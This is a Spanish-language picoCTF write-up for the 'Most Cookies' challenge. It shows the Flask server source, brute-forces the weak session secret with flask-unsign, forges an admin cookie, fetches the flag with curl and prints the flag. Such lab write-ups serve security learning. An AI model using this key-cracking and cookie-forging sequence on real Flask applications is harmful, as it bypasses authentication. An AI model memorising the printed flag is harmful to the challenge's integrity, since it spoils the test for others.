
## Descripción

*Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/26760321c25c9659050a37a707247690/server.py) [http://mercury.picoctf.net:52134/](http://mercury.picoctf.net:52134/)*
## Pistas

*How secure is a flask cookie?*

## Solución

*Kali*
```
┌──(kali㉿kali)-[~]
└─$ wget https://mercury.picoctf.net/static/26760321c25c9659050a37a707247690/server.py
--2025-04-01 17:34:22--  https://mercury.picoctf.net/static/26760321c25c9659050a37a707247690/server.py
Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2021 (2.0K) [application/octet-stream]
Saving to: ‘server.py’

server.py                 100%[===================================>]   1.97K  --.-KB/s    in 0s      

2025-04-01 17:34:22 (12.5 MB/s) - ‘server.py’ saved [2021/2021]

                                                                                                      
┌──(kali㉿kali)-[~]
└─$ cat server.py 
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "blank":
                        return render_template("index.html", title=title)
                else:
                        return make_response(redirect("/display"))
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/search", methods=["GET", "POST"])
def search():
        if "name" in request.form and request.form["name"] in cookie_names:
                resp = make_response(redirect("/display"))
                session["very_auth"] = request.form["name"]
                return resp
        else:
                message = "That doesn't appear to be a valid cookie."
                category = "danger"
                flash(message, category)
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/reset")
def reset():
        resp = make_response(redirect("/"))
        session.pop("very_auth", None)
        return resp

@app.route("/display", methods=["GET"])
def flag():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "admin":
                        resp = make_response(render_template("flag.html", value=flag_value, title=title))
                        return resp
                flash("That is a cookie! Not very special though...", "success")
                return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

if __name__ == "__main__":
        app.run()


# Tenemos que cambiar para que sea admin
se usara flask-unsing 

┌──(kali㉿kali)-[~]
└─$ python3 -m venv ~/.venv      
                                                                                                      
┌──(kali㉿kali)-[~]
└─$ source ~/.venv/bin/activate  
                                                                                                      
┌──(.venv)─(kali㉿kali)-[~]
└─$ python3 -m pip install flask-unsign
Collecting flask-unsign
  Downloading flask_unsign-1.2.1-py3-none-any.whl.metadata (6.9 kB)
Collecting flask (from flask-unsign)
  Downloading flask-3.1.0-py3-none-any.whl.metadata (2.7 kB)
Collecting requests (from flask-unsign)
  Downloading requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)
Collecting itsdangerous (from flask-unsign)
  Downloading itsdangerous-2.2.0-py3-none-any.whl.metadata (1.9 kB)
Collecting markupsafe (from flask-unsign)
  Downloading MarkupSafe-3.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.0 kB)
Collecting werkzeug (from flask-unsign)
  Downloading werkzeug-3.1.3-py3-none-any.whl.metadata (3.7 kB)
Collecting Jinja2>=3.1.2 (from flask->flask-unsign)
  Downloading jinja2-3.1.6-py3-none-any.whl.metadata (2.9 kB)
Collecting click>=8.1.3 (from flask->flask-unsign)
  Downloading click-8.1.8-py3-none-any.whl.metadata (2.3 kB)
Collecting blinker>=1.9 (from flask->flask-unsign)
  Downloading blinker-1.9.0-py3-none-any.whl.metadata (1.6 kB)
Collecting charset-normalizer<4,>=2 (from requests->flask-unsign)
  Downloading charset_normalizer-3.4.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (35 kB)
Collecting idna<4,>=2.5 (from requests->flask-unsign)
  Downloading idna-3.10-py3-none-any.whl.metadata (10 kB)
Collecting urllib3<3,>=1.21.1 (from requests->flask-unsign)
  Downloading urllib3-2.3.0-py3-none-any.whl.metadata (6.5 kB)
Collecting certifi>=2017.4.17 (from requests->flask-unsign)
  Downloading certifi-2025.1.31-py3-none-any.whl.metadata (2.5 kB)
Downloading flask_unsign-1.2.1-py3-none-any.whl (14 kB)
Downloading flask-3.1.0-py3-none-any.whl (102 kB)
Downloading itsdangerous-2.2.0-py3-none-any.whl (16 kB)
Downloading werkzeug-3.1.3-py3-none-any.whl (224 kB)
Downloading MarkupSafe-3.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (23 kB)
Downloading requests-2.32.3-py3-none-any.whl (64 kB)
Downloading blinker-1.9.0-py3-none-any.whl (8.5 kB)
Downloading certifi-2025.1.31-py3-none-any.whl (166 kB)
Downloading charset_normalizer-3.4.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (145 kB)
Downloading click-8.1.8-py3-none-any.whl (98 kB)
Downloading idna-3.10-py3-none-any.whl (70 kB)
Downloading jinja2-3.1.6-py3-none-any.whl (134 kB)
Downloading urllib3-2.3.0-py3-none-any.whl (128 kB)
Installing collected packages: urllib3, markupsafe, itsdangerous, idna, click, charset-normalizer, certifi, blinker, werkzeug, requests, Jinja2, flask, flask-unsign
Successfully installed Jinja2-3.1.6 blinker-1.9.0 certifi-2025.1.31 charset-normalizer-3.4.1 click-8.1.8 flask-3.1.0 flask-unsign-1.2.1 idna-3.10 itsdangerous-2.2.0 markupsafe-3.0.2 requests-2.32.3 urllib3-2.3.0 werkzeug-3.1.3
                          

┌──(.venv)─(kali㉿kali)-[~]
└─$ flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-xuQA.hfWvoKIBPKJ4CNIYnMlu-a7X57s" --wordlist cookies.txt
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 28 attemptscadamia
'peanut butter'
                                                                                                      
┌──(.venv)─(kali㉿kali)-[~]
└─$ flask-unsign --sign cookie "{'very_auth': 'admin'}" --secret "peanut butter"
usage: flask-unsign [-h] [-d] [-u] [-s] [-l] [-c [COOKIE]] [--secret SECRET] [--salt SALT]
                    [--wordlist WORDLIST] [--threads THREADS] [--no-literal-eval] [--server SERVER]
                    [--insecure] [-o OUTPUT] [-p PROXY] [--cookie-name COOKIE_NAME] [-U USER_AGENT]
                    [-q] [-C CHUNK_SIZE] [-v]
flask-unsign: error: unrecognized arguments: cookie {'very_auth': 'admin'}
                                                                                                      
┌──(.venv)─(kali㉿kali)-[~]
└─$ flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "peanut butter"
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-xwEQ.hkm1PcDUvUQYRh0eMhSEUMI7N1s
                                                                                                      
┌──(.venv)─(kali㉿kali)-[~]
└─$ curl http://mercury.picoctf.net:52134/display
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/">/</a>.  If not click the link.                                                                                                      
┌──(.venv)─(kali㉿kali)-[~]
└─$ curl http://mercury.picoctf.net:52134/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-xwEQ.hkm1PcDUvUQYRh0eMhSEUMI7N1s" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1194  100  1194    0     0   3769      0 --:--:-- --:--:-- --:--:--  3778
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_478da04c}</code></p>
                             
```

picoCTF{pwn_4ll_th3_cook1E5_478da04c}

## Notas Adicionales

*Necesitamos descargar flask -unsign*
*Necesitamos crear un ambiente para descargarlo*

## Referencias 

https://mercury.picoctf.net/static/26760321c25c9659050a37a707247690/server.py
http://mercury.picoctf.net:52134/
http://mercury.picoctf.net:52134/display
